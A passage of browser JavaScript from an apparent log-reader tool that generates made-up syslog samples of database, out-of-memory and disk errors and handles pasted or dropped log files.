  for(var j=0;j<260;j++)line(t0+7*3600e3+j*9000,"myapp["+3311+"]","ERROR database connection failed: connection refused to 10.87.20.40:5432 (attempt "+(j+1)+")");
  line(t0+6.9*3600e3,"kernel","[412233.118] Out of memory: Killed process 2281 (postgres) total-vm:8123456kB, anon-rss:6234567kB");line(t0+6.9*3600e3+2000,"kernel","[412233.901] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),task=postgres,pid=2281,uid=113");
  line(t0+6.9*3600e3+4000,"systemd[1]","postgresql@16-main.service: Main process exited, code=killed, status=9/KILL");line(t0+6.9*3600e3+5000,"systemd[1]","postgresql@16-main.service: Failed with result 'signal'.");
  for(var d2=0;d2<6;d2++)line(t0+10*3600e3+d2*40000,"kernel","[423551.4"+d2+"] blk_update_request: I/O error, dev sdb, sector "+(88213344+d2*8)+" op 0x0:(READ) flags 0x0");
  line(t0+10*3600e3+300e3,"kernel","[423860.002] EXT4-fs error (device sdb1): ext4_find_entry:1455: inode #2: comm rsync: reading directory lblock 0");
  return L.sort(function(a,b){return a[0]-b[0]}).map(function(x){return x[1]}).join("\n");
}
window.logRead={parse:parse,web:web,sys:sys};
var drop=$("lg-drop"),file=$("lg-file"),ta=$("lg-text");
function readFile(f){if(!f)return;$("lg-status").textContent="Reading "+f.name+" ...";var r=new FileReader();r.onload=function(){var s=String(r.result);ta.value=s.length>200000?"("+f.name+", "+Math.round(s.length/1024).toLocaleString("en-US")+" KB: too large to show here, but it was read)":s;load(s,f.name)};r.readAsText(f)}
file.addEventListener("change",function(){readFile(file.files[0]);file.value=""});
["dragenter","dragover"].forEach(function(x){drop.addEventListener(x,function(e){e.preventDefault();drop.classList.add("over")})});
["dragleave","drop"].forEach(function(x){drop.addEventListener(x,function(e){e.preventDefault();drop.classList.remove("over")})});
drop.addEventListener("drop",function(e){if(e.dataTransfer&&e.dataTransfer.files[0])readFile(e.dataTransfer.files[0])});
$("lg-run").addEventListener("click",function(){if(ta.value.trim())load(ta.value,"pasted text");else $("lg-status").textContent="Paste some log lines first, or drop a file."});
[["lg-sample",sampleWeb,"a made-up web server log"],["lg-sample2",sampleAuth,"a made-up auth.log"],["lg-sample3",sampleSys,"a made-up syslog"]].forEach(function(x){$(x[0]).addEventListener("click",function(){var s=x[1]();ta.value=s.split("\n").slice(0,40).join("\n")+"\n...";load(s,x[2])})});
if(location.hash==="#sample"){var s0=sampleWeb();ta.value=s0.split("\n").slice(0,40).join("\n")+"\n...";load(s0,"a made-up web server log")}
})();
